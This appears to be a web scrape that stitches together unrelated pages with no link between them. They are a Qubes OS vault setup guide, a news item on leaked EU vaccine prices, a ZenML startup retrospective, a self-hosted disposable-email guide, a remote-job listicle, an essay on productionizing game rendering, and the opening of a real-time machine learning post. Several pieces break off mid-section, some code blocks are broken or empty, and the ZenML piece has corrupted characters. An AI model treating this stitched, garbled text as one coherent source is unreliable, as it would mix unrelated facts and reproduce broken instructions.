<p>Then I enable the service updates-proxy-setup for vault (still in dom0):</p>

<div><div><pre><code>qvm-service <span>--enable</span> vault updates-proxy-setup
</code></pre></div></div>

<p>The list of enabled services for <em>vault</em> can be displayed with this commmand:</p>



<p>The output in my case is:</p>

<div><div><pre><code>updates-proxy-setup on
qubes-update-check  off
cups                off
</code></pre></div></div>

<p>I keep the <em>qubes-update-check</em> service disabled because somehow it doesn’t work for me. Not a big deal.</p>

<p>Now I turn on <em>vault</em> (or reboot if it was on) and I check that the global var PROXY_ADDR is populated:</p>



<p>It should print:</p>



<p>Also <code>/run/qubes-service/updates-proxy-setup</code> should be present (and empty).</p>

<p>This means that the <em>updates-proxy-setup</em> service was started correctly.</p>

<p>This step should be optional but I run it to be sure:</p>

<div><div><pre><code><span>sudo</span> /usr/lib/qubes/update-proxy-configs
</code></pre></div></div>

<p>This populates some configurations files in <code>/etc/</code> . I check that they were populated correctly:</p>

<div><div><pre><code><span>cat</span> /etc/apt/apt.d/01qubes-proxy
<span>cat</span> /etc/PackageKit/PackageKit.conf
</code></pre></div></div>

<p>They should both refer to the proxy server <code>http://127.0.0.1:8082</code></p>

<p>Finally I run <code>sudo apt update</code> and everything works as expected.</p>

<p>Now I’m able to install and update debian packages but I’m not able to download anything that doesn’t exist in the standard Debian repository so anytime I need something outside the standard repositories I download the additional software in a different network-connected qube (<em>joe-devq</em>) and pass it to <em>vault</em> via <code>qvm-copy</code>.</p>

<h2 id="generic-software">Generic software</h2>

<p>I like to install these general purpose packages:</p>

<div><div><pre><code><span>sudo </span>apt install apt-file wipe coreutils locate tree pwgen git
</code></pre></div></div>

<h2 id="software-for-secrecy">Software for secrecy</h2>

<p>This some security-focused software:</p>

<div><div><pre><code><span>sudo </span>apt update
<span>sudo </span>apt install cryptsetup pass gnupg2 qubes-gpg-split e2fsprogs steghide pass xclip libsodium18 libtinfo5
</code></pre></div></div>

<blockquote>
  <p>WARNING: the GPG version must be &gt;= 2.1 <code>apt-cache show gnupg2 | grep -i version</code></p>
</blockquote>

<p>I install <code>e2fsprogs</code> because I need <code>chattr</code>.</p>

<p>I install <code>xclip</code> so that I can copy passphrases and passwords in the clipboard. It’s optionally used by <code>pass</code> and a requirement for <code>risks</code>.</p>

<p><code>libsodium18</code> and <code>libtinfo5</code> are required for compiling <code>mpw</code> later on.</p>

<blockquote>
  <p>Different Debian versions use different libraries so the final number might change.</p>
</blockquote>

<p>I also install <code>sox</code> (which contains <code>play</code>) because I like to hear some sound when the sdcard is mounted or dismounted. This is optional.</p>



<h2 id="improved-entropy">Improved entropy</h2>

<p>The <code>haveged</code> service increases the system’s entropy. Higher entropy improves the quality of the keys during their generation.</p>

<div><div><pre><code><span>sudo </span>apt install haveged rng-tools
</code></pre></div></div>

<p>I check that the haveged service is running:</p>

<div><div><pre><code><span>sudo </span>systemctl is-active haveged.service
</code></pre></div></div>
<p>Output:</p>



<p>I check how much entropy my system is capable to generate:</p>

<div><div><pre><code><span>cat</span> /proc/sys/kernel/random/entropy_avail
</code></pre></div></div>

<p>Output:</p>



<p>The value ranges between 0 and 4096. The higher the better. (<code>man random.4</code> -&gt; entropy_avail). 2113 is probably not great but it seems ok.</p>

<p>Now, I test my entropy level with <code>rngtest</code>:</p>

<div><div><pre><code><span>cat</span> /dev/random | rngtest <span>-c</span> 1000
</code></pre></div></div>

<p>Output</p>

<div><div><pre><code>rngtest 2-unofficial-mt.14

<p>Look for <em>rngtest: FIPS 140-2 successes</em>: it should score as close as possible to 1000.</p>

<h2 id="disable-bash-history">Disable bash history</h2>

<p>Bash keeps a very comfortable log (called bash history) of the commands typed by the user in any terminal.</p>

<p>In <em>vault</em> though I prefer to disable bash history so that it’s not so obvious to see the commands I’m using.</p>

<div><div><pre><code><span>echo</span> <span>'unset HISTFILE'</span> <span>&gt;&gt;</span> .bashrc
<span>source</span> .bashrc
wipe <span>-f</span> .bash_history
</code></pre></div></div>
<p>With this configuration bash remembers only the commands typed in the current session. They are lost when the qube is restarted.</p>

<h2 id="turn-off-swap">Turn off swap</h2>

<p>I turn off swap to prevent that something can be written in the swap area and later recovered by an attacker. It’s also a Tomb requirement.</p>

<p>sudo swapoff -a</p>

<p>I test that the swap if off:</p>

<div><div><pre><code>free -h
            total        used        free      shared  buff/cache   available
Mem:           465M        203M         36M        6.2M        225M        243M
Swap:            0B          0B          0B
</code></pre></div></div>

<p>The swap size is 0B. Good.</p>

<p>I make this permanent by modifying the <code>rc.local</code> script</p>

<div><div><pre><code><span>sudo </span>sh <span>-c</span> <span>"sed 's/bin</span><span>\/</span><span>sh/bin</span><span>\/</span><span>bash/g' -i /rw/config/rc.local"</span>
<span>sudo </span>sh <span>-c</span> <span>'echo "swapoff -a" &gt;&gt; /rw/config/rc.local'</span>
</code></pre></div></div>

<h2 id="install-tomb">Install tomb</h2>

<p>Tomb requires some additional packages:</p>

<div><div><pre><code><span>sudo </span>apt-get install pinentry-curses zsh

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
									<p>The EU’s vaccine prices were — for a short time and by accident — finally made public.</p>
<p>Belgium’s Budget State Secretary Eva De Bleeker on Thursday tweeted a table with the price of each vaccine purchased by the EU and how much Belgium will spend in total on the vaccines, according to <a href="https://www.hln.be/binnenland/zoveel-gaan-we-betalen-voor-de-coronavaccins-staatssecretaris-zet-confidentiele-prijzen-per-ongeluk-online~a3dceef4/" target="_blank">Belgian news site HLN</a>. The tweet has since been deleted, but the outlet published a screenshot.</p>
<p>The European Commission has said it cannot disclose the prices paid for each coronavirus vaccine, citing commercial confidentiality agreements.</p>

<p>Civil society groups, MEPs and health advocates <a href="https://www.politico.eu/article/commission-under-fire-for-lack-of-vaccine-transparency/">have been calling</a> for months for the Commission to reveal how much the EU is paying, arguing that deals involving taxpayer funds should have greater transparency. </p>
<p>The Commission signed deals with six producers and completed exploratory talks with a seventh on Thursday. Countries will place their orders individually for each vaccine.</p>
<p>According to the screenshot published by HLN, the EU is spending between €1.78 and $18 per coronavirus vaccine. The price per dose listed for each of the six vaccines was as follows: </p>
<ul>
<li>Oxford/AstraZeneca: €1.78</li>
<li>Johnson &amp; Johnson, $8.50 </li>
<li>Sanofi/GSK: €7.56</li>
<li>BioNTech/Pfizer: €12 </li>
<li>CureVac: €10 </li>
<li>Moderna: $18 </li>
</ul>
<p>Belgium will purchase more than 33 million vaccines for a total of €279 million. </p>
<p>De Bleeker said that publication of the price breakdown was “a mistake on the part of the communications team,” according to HLN. </p>
<p>In reaction to questions by opposition MPs about the potential consequences of the violation of confidentiality, De Bleeker <a href="https://www.vrt.be/vrtnws/nl/2020/12/17/prijzen-vaccins/" target="_blank">said</a> the blunder would not “endanger anything” concerning Belgium’s access to vaccines.</p>

<p>According to HLN, the European Commission said: “We will not comment on what happened in Belgium, but the prices of the vaccines are confidential.”</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section id="post-content">
    <div id="blogpost">
        <p>As this is the end of the year, itâ€™s a great chance to remind yourself: how did we get here?</p>

<p>Let me beginn with a flashback to 2019. As a company, weâ€™re focussed on optimising remaining useful live of industrial assets through clever use of Machine Learning for predictive analysis, root-cause analysis and other forms of reasoning. We managed to secure a few big projects and very promising POCs, and across the board we were able to show good results. One of our projects even got government funding, providing a nice runway going forward.</p>

<p>We got the traditionally lengthy sales cycles with many leading industry players started, and we even hired our first full-time employee.</p>

<p>All was set up for first commercial success of our approach and our â€œasset optimisation platformâ€� in 2020.</p>

<p>Then the pandemic hit. Within a few weeks, all our sales leads fizzled away - millions of euros in deal sizes, disappeared in thin air. By March, we were looking at an empty sales funnel.</p>

<p>We had find a new path. We took stock, and we acted entrepreneurial.</p>

<h2 id="a-look-at-what-weve-got">A look at what weâ€™ve got</h2>

<p>Taking stock of what we actually had, in terms of intellectual property, was a great recap of our journey so far <a href="https://www.youtube.com/watch?v=UDfxoKmc8qc">(if youâ€™re interested, check out a talk I recently gave on what we learned about ML pipelines)</a>. To summarise, we had to our name:</p>

<ul>
  <li>A great team (experienced ML engineers, Ops expertise and a good entrepreneurial fit)</li>
  <li>A purpose-built tech stack for reproducible ML pipelines</li>
  <li>Experience running small and large projects</li>
  <li>A good network of other startups and developers in ML-related positions across the globe</li>
</ul>

<h2 id="talking-to-people">Talking to people</h2>

<p>We saw the economic effects of the pandemic very early - at least from an european perspective. After taking close stock, we had to understand how (and if) Machine Learning would continue to play a role for our leads and network. Taking a page out of the great UX researchers Iâ€™ve had the chance to work with over my career, we decided to do user interviews. Lo and behold, after doing ~30 early interviews, a picture emerged.</p>

<p>Teams engaged in ML projects lost significant chunks of time on unrepeatable projects as well as managing dysfunctional franken-infrastructures. Teams not yet engaged in ML feared it to be a black hole for time and effort to build up a reliable tech stack for getting experiments into production, as existing systems would need integration at many stages of the ML lifecycle.</p>

<p>An interesting side-fact became clear to us, too: there was a lot of scepticism towards ML-based SaaS products, but a lot of trust towards dev-tooling.</p>

<p>More importantly, however - we had solved exactly the problems our interviewees faced for ourselves. We were sitting on something commercially relevant, and we were looking at a great opportunity.</p>

<h2 id="understanding-your-market-part-one">Understanding your market, part one</h2>

<p>With this new-found confirmation we set out to transform our tech-stack from internal-facing supportive tooling to an actual product. Looking at the market, a split was noticeable.</p>

<p>On the one side, open-source tooling like Kubeflow and MLFlow was solving aspects of the MLOps problem space, but posed significant investments to the teams we were talking to in our interviews. Tooling was either missing the point of Data Scientists, or alienated product leads and DevOps teams with convoluted, messy or badly documented paths from experiment to production.</p>

<p>On the other side were very expensive commercial solutions, attempting to solve large chunks of the ML lifecycle with proprietary offerings.</p>

<h2 id="commercial-first">Commercial-first</h2>

<p>Given the layout of the MLOps market, we spotted an opportunity to flip the proverbial table. Donâ€™t get me wrong, weâ€™re not radical geniuses, we much rather are interested observers of entrepreneurial trends. Given the success of Stripe, Segment and others, this constellation of players screamed â€œtransactional business modelâ€� to us. A managed MLOps platform to train models easily in various public clouds, at linearly scaling prices, based on actual usage, not arbitrary license models or per-seat, and at a fraction of the going rates.</p>

<h2 id="understanding-the-market-part-two">Understanding the market, part two</h2>

<p>By now we know: Our hypothesis, teams are just waiting for a managed MLOps solution with usage-based pricing and reproducible pipelines as focus, was off. This was not immediately clear to us, of course.</p>

<p>One of our smartest plays saved us in the end - we never stopped doing user interviews. We demoâ€™ed our product status quo multiple times per week, we had two soft-launches and continuously engaged with the community on conferences, reddit, slack - you name it.</p>

<p>And people loved our take on MLOps. Our vision resonated deeply. All model trainings are guaranteed to be reproducible, tracking is deeply baked-in, integrations to popular tooling are easy and extensible - these are the key concerns of the teams we were talking to.</p>

<p>However, it would have been ludicrous to switch their tech-stacks to a commercial solution. No, if we wanted to drive adoption and actually have an impact on how the world dealt with MLOps, we had to give these teams the option to adopt our vision in their projects on their own terms. We had to open-source.</p>

<p>As Iâ€™ve written in the past, <a href="http://blog.maiot.io/open-source">we are huge proponents of open-source software</a>. Large parts of our own tooling would be possible without the work of open-source giants, on whose shoulders we can stand.</p>

<h2 id="the-jury-is-still-out">The jury is still out</h2>

<p>As of writing this, the jury is still out if weâ€™re leaving the dent in the universe that we want to leave behind. But, and this is a hugely rewarding feeling, we have all the right indications that we nailed it this time. Weâ€™ve breached 200 GitHub stars in less than a week of going public, weâ€™ve been on the front page of Hackernews, weâ€™ve been trending on GitHub, and ZenML is racing to 1000 <code>pip install</code>â€™s.</p>

<p>If youâ€™re running ML projects, or just personally got curious, head over to <a href="https://github.com/maiot-io/zenml">ZenMLâ€™s GitHub page</a> and get started with reproducible Machine Learning!</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
            <div>
                <div>
                                                                                <p><img src="https://neilzone.co.uk/content/images/20201227164320-Screenshot%202020-12-27%20at%2016.42.25.png" alt="Screenshot of webpage showing AHEM email service"></p>

<p>I've run my own mailserver for years now, with a <em>catch-all</em> on some domains.</p>

<p>This means that, whenever a shop or service asks for my email address, I can give them a unique address, specific to them, without needing to configure anything.</p>

<p>This has a number of uses, but the main ones for me are:</p>

<ul>
<li>if their system is compromised, my email address is of no use for credential stuffing attacks (since it is used only for that one site/service)</li>
<li>if I get spam from which I cannot unsubscribe, I can kill that email address without disrupting anything else</li>
<li>if they leak or sell my email address, and someone else uses it, I can tell</li>
</ul>

<p>One thing this setup does not do well, though, is deal with the situation in which I want a disposable email address: an email address which exists long enough to receive one email.</p>

<p>That's because, once I've given someone their unique address, they can continue sending to it, and it will continue to funnel their email into my mailbox, until I take action to stop them.</p>

<p>Sometimes, I want — well, am forced — to give over an email address just to access something. (For example, I wanted to download a cycle map from Sustrans the other day, and they insisted on having an email address, which is nonsensical as they just emailed me a link to a PDF on their website. Why not just hyperlink the PDFs from the website, and skip the hassle?! (Spoiler: probably some kind of tracking.).)</p>

<p>In that kind of situation, I want a system for disposable email addresses, which exist only for a very short period of time, and which do not clog up my mailbox.</p>



<p>There are loads of services which offer this, some free and some paid, and, to date, I've just used one of those. Since I've not used them for anything private, it didn't matter too much to me that someone else can see the content of the email.</p>

<p>Indeed, if you are looking for privacy from "hiding in a crowd", using a third party service is probably <em>preferable</em> to hosting your own service.</p>

<p>However, that trade-off was acceptable to me, and since I prefer to host my own tools, having my own setup seemed like a useful thing to have, if it was relatively easy to do.</p>

<p>And it was.</p>

<p>Relatively.</p>



<p>It took me about 30 minutes to get a disposable email server running using <a href="https://github.com/o4oren/Ad-Hoc-Email-Server">AHEM</a>.</p>

<p>The instructions on github sort of worked, and I can't tell if the bits which did not work out of the box are because of my lack of familiarity with node.js, or incomplete / no longer accurate instructions. Let's assume it's my ignorance!</p>

<p>I had a bit of a fight with angular, to make the project build, and I solved the error message by forcibly installing a particular version of it. Not ideal, but it worked.</p>

<p>After that, it built with some warnings but no more errors.</p>



<p>Since it's an email service, you need to set an MX record for the domain you want to use, pointing to a record pointing to the IP address on which you're running AHEM.</p>

<p>I chose a sub-domain of my normal domain. I'm using it for both the email addresses, and also for accessing the web server (via nginx).</p>

<p>AHEM can support multiple email domains, so if I wanted to do the same for one of Sandra's domains, it would be a simple case of adding the domain to AHEM's .env file.</p>



<p>I can understand why people do it, but it bugs me all the same: why use static files hosted by a third party CDN, rather than just hosting them yourself?</p>

<p>Out of the box, AHEM uses some JavaScript resources hosted on Cloudflare. I used wget to download the scripts, and then replaced the references in index.html with localhost references instead.</p>

<p>Bingo.</p>



<p>By default, it runs on localhost:3000. Fine for testing, but not what I wanted permanently.</p>

<p>Since I had nginx on the server already, reverse-proxying to give a web interface over port 80, using the same sub-domain as for the email address itself (although anything else would work too; they are not connected) was easy.</p>

<p>It also meant that it was trivial (using certbot) to pop a TLS certifcate on the proxy, giving me TLS over 443. Even though the web interface will be firewalled off and accessible only without our private network, I'd prefer to have TLS in place anyway.</p>

<p>I'm not sure why, but the basic config was 404'ing traffic to /socket.io/, so I added a specific <em>Location</em> section for that:</p>

<pre><code>location /socket.io/ {
    proxy_pass http://localhost:3000;       
    proxy_http_version 1.1;
    proxy_set_header Upgrade $http_upgrade;
    proxy_set_header Connection "Upgrade";
    proxy_set_header Host $host;
}
</code></pre>



<p>I'm not that familiar with node.js, so there might be a better way of doing this, but I was struggling to keep it running when I closed my ssh connection.</p>

<p>I could just run it as a background process (by appending &amp; to the command), but I installed  pm2:</p>

<pre><code>npm install pm2 -g
</code></pre>

<p>and then ran it using:</p>

<pre><code>pm2 start ahem.js
</code></pre>



<p>Now, I have a simple to use, self-hosted, web page, which lets me generate random email addresses to paste into webforms when I want a disposable address.</p>

<p>I need to refresh the page to check if an email has arrived, but that's fine. I should check if there's something I've not configured correctly, as I'd have thought it would refresh periodically, if nothing fancier existed to show an email when it arrives.</p>

<p>Email are deleted automatically when they are 24 hours old; again, this is something configurable via .env, but that seems fine as a default.</p>



<p>A couple of weeks ago, AHEM <a href="https://github.com/o4oren/Ad-Hoc-Email-Server/pull/41/commits/4c4bc7fb34a056ff47abc96d32c066023d7c7e37">changed its licence</a> from an in-house job to Apache 2.0.</p>

<p>This is a good decision, IMHO, but still needs to be reflected in the AHEM interface, since this says that it's only "available for personal and internal use".</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><div><div><div><div><div><p>Maybe you are looking for a job you can do from home because you are tired of your daily commute or because you want to spend more time with your family. Maybe you want to travel a bit more and that’s why you are looking for a location-independent position. No matter what your reason is, online jobs are more popular than ever before. Check out the best remote job sites to find an online job you can do anywhere and anytime.</p><h2><span id="How_Important_Are_Online_Jobs"></span>How Important Are Online Jobs?<span></span></h2><p>Before we jump right into the list, let’s have a look at some facts and numbers.</p><p>40% of the entire American workforce will be doing <a href="https://www.officevibe.com/blog/11-incredible-coworking-statistics-infographic" target="_blank" rel="noopener noreferrer">freelance work in 2020</a>. There are estimations, that <a href="https://levels.io/future-of-digital-nomads/" target="_blank" rel="noopener noreferrer">by the year 2035 there will be 1 billion digital nomads</a> on this planet. That means that remote jobs will become more and more important. People are realizing, that the location-independent lifestyle has many advantages. The Digital Nomad Survey from 2016 shows, what people like most about this lifestyle:</p><ul><li>It gives them a better work/life balance than office work.</li><li>85% of all digital nomads feel happier with this lifestyle.</li><li>They are less stressed when they do telecommuting work.</li><li>They also enjoy schedule flexibility, the fact that they can work from home and don’t have to commute anymore.</li></ul><p>The industry has taken note of that, too. By the end of 2017, more than <a href="http://www.deskmag.com/en/the-complete-2017-coworking-forecast-more-than-one-million-people-work-from-14000-coworking-spaces-s" target="_blank" rel="noopener noreferrer">14,000 coworking spaces</a> will be in operation around the world, providing location-independent professionals an alternative working environment.</p><p>Moreover, remote job sites are booming and new websites dedicated to online jobs are appearing on a regular basis. These websites show not only open positions for<strong> freelancers</strong>, but also for people who seek to work in a <strong>permanent contract</strong> with a company, but on a remote basis.</p><p>Some of these websites are free to use, but you have to pay a certain fee once you close a deal or a certain percentage of the agreed payment. Other websites charge you to search for jobs, but you don’t have to pay anything once you close a contract. Very few are entirely free to use.</p><p>The following list includes the most popular remote job sites out there. Have a look around and find the platform that works best for you.</p><p><img loading="lazy" src="https://www.digitalnomadsoul.com/wp-content/uploads/2017/08/Remote-Job-Sites-4-1024x682.jpg" alt="Remote Job Sites, Digital Nomad, Online Job, Make Money Online, Location-Independent Job, Job Search, Hire Remote Worker, Freelancer" width="515" height="343" srcset="https://www.digitalnomadsoul.com/wp-content/uploads/2017/08/Remote-Job-Sites-4.jpg 1024w, https://www.digitalnomadsoul.com/wp-content/uploads/2017/08/Remote-Job-Sites-4-300x200.jpg 300w, https://www.digitalnomadsoul.com/wp-content/uploads/2017/08/Remote-Job-Sites-4-768x512.jpg 768w" sizes="(max-width: 515px) 100vw, 515px" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20515%20343'%3E%3C/svg%3E" data-lazy-srcset="https://www.digitalnomadsoul.com/wp-content/uploads/2017/08/Remote-Job-Sites-4.jpg 1024w, https://www.digitalnomadsoul.com/wp-content/uploads/2017/08/Remote-Job-Sites-4-300x200.jpg 300w, https://www.digitalnomadsoul.com/wp-content/uploads/2017/08/Remote-Job-Sites-4-768x512.jpg 768w" data-lazy-src="https://www.digitalnomadsoul.com/wp-content/uploads/2017/08/Remote-Job-Sites-4-1024x682.jpg"></p><h2><span id="The_Best_Remote_Job_Sites"></span>The Best Remote Job Sites<span></span></h2><h3><span id="FlexJobs"></span>FlexJobs<span></span></h3><p><a href="http://flexjobsrocks.go2cloud.org/aff_c?offer_id=1&amp;aff_id=1722" target="_blank" rel="nofollow noopener noreferrer">Flexjobs </a>is focused on part-time, full-time and flexible remote jobs and has more than 100 job categories.&nbsp; All jobs are hand-screened so you can be sure it’s not a scam.

<h2>Intro</h2>



<p>This post will cover challenges and aspects of production to consider when creating new rendering / graphics techniques and algorithms – especially in the context of <strong>applied research for real time rendering</strong>. I will base this on my personal experiences, working on <strong>Witcher 2, Assassin’s Creed 4: Black Flag, Far Cry 4, and God of War</strong>.</p>



<p>Many of those challenges are easily ignored – they are <strong>real problems in production</strong>, but not necessarily there only if you only read about those techniques, or if you work on pure research, writing papers, or create tech demos.</p>



<p>I have seen statements like “why is this brilliant research technique X not used in production?” both from gamers, but also from my colleagues with academic background. And there are always some good reasons!</p>



<p>The post is also inspired by <a href="https://twitter.com/bartwronsk/status/1327509557015310336">my joke tweet</a> from a while ago about appearing smart and mature as a graphics programmer by “dismissing” most of the rendering techniques – that they are not going to work on foliage. 🙂&nbsp;And yes, I will come back to vegetation rendering a few times in this post.</p>



<p>I tend to think of this topic as well when I hear discussions about how “photogrammetry, raytracing, neural rendering, [insert any other new how topic] will be a universal answer to rendering and replace everything!”. Spoiler alert: not gonna happen (soon).</p>



<h2>Target audience</h2>



<p>Target audience of my post are:</p>



<ul><li>Students in computer graphics and applied researchers,</li><li>Rendering engineers, especially ones earlier in their career – who haven’t built their intuition yet,</li><li>Tech artists and art leads / producers,</li><li>Technical directors and decision makers without background in graphics,</li><li>Hardware engineers and architects working on anything GPU or graphics related (and curious what makes it complicated to use new HW features),</li><li>People who are excited and care about game graphics (or real time graphics in general) and would like to understand a bit “how sausages are made”. Some concepts might be too technical and too much jargon, but then feel free to skip those.</li></ul>



<p>Note that I didn’t place “pure” academic researchers in the above list – as I don’t think that pure research should be considering too many obstacles. Role of the fundamental research is inspiration and creating theory that can be later productionized by people who are experts in productionization.</p>



<p>But if you are a pure researcher and somehow got here, I’ll be happy if you’re interested in what kinds of problems might be on the long way from idea or paper to a product (and <strong>why most new genuinely good research will never find its place in products</strong>).</p>



<h2>How to interpret the guide</h2>



<p>Very important note – <strong>none </strong>of the “obstacles” I am going to describe <strong>are deal breakers</strong>.</p>



<p>Far from it – most successful tech that became state of the art violates many of those constraints! It simply means that those are challenges that will need to be overcome in some way – manual workarounds, feature exclusivity, ignoring the problems, or applying them only in specific cases.</p>



<p>I am going to describe first the <strong>use-cases</strong> – potential uses of the technology and how those impact potential requirements and constraints.</p>



<h2>Use case</h2>



<p>The categories of “use cases” deserve some explanation and description of “severity” of their constraints.</p>



<h3>Tech demo&nbsp;</h3>



<p>Tech demo is the easiest category. If your whole product is a <strong>demonstration of a given technique </strong>(whether for benchmarking, showing off some new research, artistic demoscene), most of the considerations go away.</p>



<p>You can actually retrofit everything: from the demo concept, art itself, camera trajectory to show off the technology the best and avoid any problems.</p>



<p>The main considerations will be around performance (a choppy tech demo can be seen as a tech failure) and working very closely with artists able to show it off.</p>



<p>The rest? Hack away, write one-off code – just don’t have expectations that turning a tech demo into a production ready feature is simple or easy (it’s more like the 99% of work remaining).</p>



<h3>Special level / one-off</h3>



<p>The next level “up” in the difficulty is creating some <strong>special features that are one-off</strong>. It can be some visual special effect happening in a single scene, game intro, or a single level that is different from the other ones. In this case, a feature doesn’t need to be very “robust”, and often replaces many others.</p>



<p>An example could be lighting in the jungle levels in Assassin’s Creed 4: Black Flag that I worked on.&nbsp;</p>



<div><figure><img src="https://lh3.googleusercontent.com/51bdx_bCzH7HBQ7NjppuafWVspC1jLwJ4OwbTLwYq1DLDnnOlxNGZtXby8mLGdqhnjC00WyxAfq1L3d8EIOatPflkT4phHF4Xq2WxOeUSlRCymYNEPQW3WiOeywiz8edAD592PNh" alt="" width="458" height="610"><figcaption>Source: Assassin’s Creed 4: Black Flag promo art. Notice the caustics-like lightshafts that were key rendering feature in jungle levels – and allowed us to save a lot on the shadows rendering!</figcaption></figure></div>



<p>Jungles were “cut off” from the rest of the open world by special streaming corridors and we completely replaced the whole lighting in them! Instead of relying on tree shadow maps and global lighting, we created <strong>fake “caustics”</strong> that looked much softer and played very nicely with our volumetric lighting / atmospherics system. They not only looked better, but also were much faster – obviously worked only because of those special conditions.</p>



<h3>Cinematics</h3>



<p>A slightly more demanding type of feature is cinematic-only one. Cinematics are a bit different as they can be very strictly controlled by cinematic artists and <strong>most of their aspects like lighting, character placement, or animations are faked</strong> – just like in regular cinema! Cinematics often feature fast camera cuts (useful to hide any transitions/popping) and have more computational budget due to more predictable nature (and even in 60fps console games rendered in 30fps).</p>



<div><figure><img src="https://lh3.googleusercontent.com/g3SLk16AtqBNz6TfdSXtNhMDqo6sPXIrwQUQWEjGas1fZ3vYUVLWf_vC5or3-Gen-0Z1WRlt9M46eDiBv5b1tSmU_A0aqKPbq2zR-iJ5IerV42EpuGfrgdTtJVygjhpuQ7R1_-0C" alt=""><figcaption>Witcher 2 cinematic featuring higher character LODs, nice realistic large radius bokeh and custom lighting – but notice how few objects to render are there!</figcaption></figure></div>



<h3>Regular rendering feature</h3>



<p>“Regular” features – lighting, particles, geometry rendering – are the <strong>hardest category</strong>. They need to be either very easy to implement (most of the obstacles / problems solved easily), provide huge benefits surpassing state of the art by far to facilitate the adoption pain, or have some very excited team pushing for it (never underestimate the drive of engineers or artists that really want to see something happen!).</p>



<p>Most of my post will focus on those.&nbsp;</p>



<h3>Key / differentiating feature</h3>



<p>Paradoxically, if something is a key or differentiating feature, this can alleviate many of the difficulties. Let’s take VR – there stereo, performance (low latency), and perfect AA with no smudging (so rather forget about TAA), are <strong>THE features and absolutely core to the experience</strong>. This means that you can completely ignore for example rendering foliage or some animations that would look uncannily – as being immersed and the VR experience of being there are much more important!</p>



<h2>Feature compatibility</h2>



<p>Let’s have a look at compatibility of a newly developed feature with some other common “features” (the distinction between “features”, and the next large section “pipeline” is fuzzy).</p>



<p>Features are not the most important of challenges – arguably the category I’m going to cover at the end (the “process”) is. But those are fun and easy to look at!&nbsp;</p>



<h3>Dense geometry</h3>



<p>Dense geometry like <strong>foliage </strong>– a “feature” that inspired this post – is an enemy of most rendering algorithms.</p>



<p>The main problem is that with very dense geometry (lots of overlapping and small triangles), many “optimizations” and assumptions become impossible.</p>



<p>Early Z and occlusion culling? Very hard.&nbsp;</p>



<p>Decoupling surfaces from volumes? Very hard.</p>



<p>Storing information per unique surface parametrization? Close to impossible.</p>



<p>Amount of vertices to animate and pixels to shade? Huge, shaders need simplification!</p>



<div><figure><img src="https://lh4.googleusercontent.com/P3m7eTgVGodadf6TSd7Ca4Th8wedlR3AEr0wghmVTz0klnfU2hUTq4K1jRdhLljGMRQKgiG-pq02Ayc5Dtllma_jLOF60rtSCx0jID78CYen8cyAW3z2N_bCPYh7KvemZ2k8bWIX" alt=""><figcaption>Witcher 2 foliage – that density! Still IMO one of the best forests in any game.</figcaption></figure></div>



<p>Dense geometry through which you can see (like grass blades) is incompatible with many techniques, for example lightmapping (storing a precomputed lighting per every grass blade texel would be very costly).</p>



<p>If a game has a tree here and there or is placed in a city, this might not be a problem. But for any “natural” environment, a big chunk of the productionization of any feature is going to be combining it to coexist well with foliage.</p>



<h3>Alpha testing</h3>



<p>Alpha testing is an extension of the above, as it disables even more hardware features / optimizations.</p>



<p>Alpha testing is a technique, when a pixel evaluates “alpha” value from a texture or pixel shader computations, and <strong>based on some fixed threshold, doesn’t render/write it</strong>.</p>



<p>It is much faster than alpha blending, but for example disables early z writes (early z tests are ok), and requires raytracing hit shaders and reading a texture to decide if a texel was opaque or not.</p>



<p>It also makes antialiasing very challenging (forget about regular MSAA, you have to emulate alpha to coverage…).</p>



<p>For a description and great visual explanation of some problems, see this blog post of <a href="https://bgolus.medium.com/anti-aliased-alpha-test-the-esoteric-alpha-to-coverage-8b177335ae4f">Ben Golus</a>.</p>



<h3>Animation – skeletal</h3>



<p>Most animators work with “skeletal animations”. <strong>Creating rigs, skinning meshes, animating skeletons</strong>. When you create a new technique for rendering meshes that relies on some heavy precomputations, would animators be able to “deform” it? Would they be able to plug it into a complicated animation blending system? How does it fit in their workflow?</p>



<p>Note that it can also mean rigid deformations, like a rotating wheel – it’s much cheaper to render complicated objects as a skinned whole, than splitting them.</p>



<p>And animation is a must, cannot be an afterthought in any commercial project.</p>



<figure><img src="https://lh5.googleusercontent.com/WBPNVuhqPnwXvUjbrp1UpzraK24bQT3VrXJgslGPgwWqC2M__So3SISqaiBrNytVVvy7HqVV6V64o1VFsAM5NxbzOEn5lwll6ayTOd49M5oC2rF9AAHk5ryI--vv8lqe2rCPWBoU" alt=""><figcaption>Witcher 2 trebuchets were not people, but also had “skeletons” and “bones” and were using skeletal animations!</figcaption></figure>



<h3>Animation – procedural and non-rigid</h3>



<p>The next category of animations are “procedural” and non-rigid. Procedural animations are useful for any animation that is “endless”, relatively simple, and shouldn’t loop too visibly. The most common example is <strong>leaf shimmer and branch movement</strong>.</p>

    <p>After talking to machine learning and infrastructure engineers at major Internet companies across the US, Europe, and China, I noticed two groups of companies. One group has made significant investments (hundreds of millions of dollars) into infrastructure to allow real-time machine learning and has already seen returns on their investments. Another group still wonders if there’s value in real-time ML.</p>

<p>There seems to be little consensus on what real-time ML means, and there hasn’t been a lot of in-depth discussion on how it’s done in the industry. In this post, I want to share what I’ve learned after talking to about a dozen companies that are doing it.</p>

<p>There are two levels of real-time machine learning that I’ll go over in this post.</p>
<ul>
  <li>Level 1: Your ML system makes predictions in real-time (online predictions).</li>
  <li>Level 2: Your system can incorporate new data and update your model in real-time (online learning).</li>
</ul>

<p>I use “model” to refer to the machine learning model and “system” to refer to the infrastructure around it, including data pipeline and monitoring systems.</p>

<h2 id="online_predictions">Level 1: Online predictions - your system can make predictions in real-time</h2>
<p><em><b>Real-time</b> here is defined to be in the order of milliseconds to seconds.</em></p>

<h3 id="online_predictions_use_cases">Use cases</h3>
<p>Latency matters, especially for user-facing applications. In 2009, Google’s experiments demonstrated that <a href="https://services.google.com/fh/files/blogs/google_delayexp.pdf">increasing web search latency 100 to 400 ms reduces the daily number of searches per user by 0.2% to 0.6%</a>. In 2019, <a href="https://blog.acolyer.org/2019/10/07/150-successful-machine-learning-models/">Booking.com found that an increase of 30% in latency cost about 0.5% in conversion rates — “a relevant cost for our business.”</a></p>

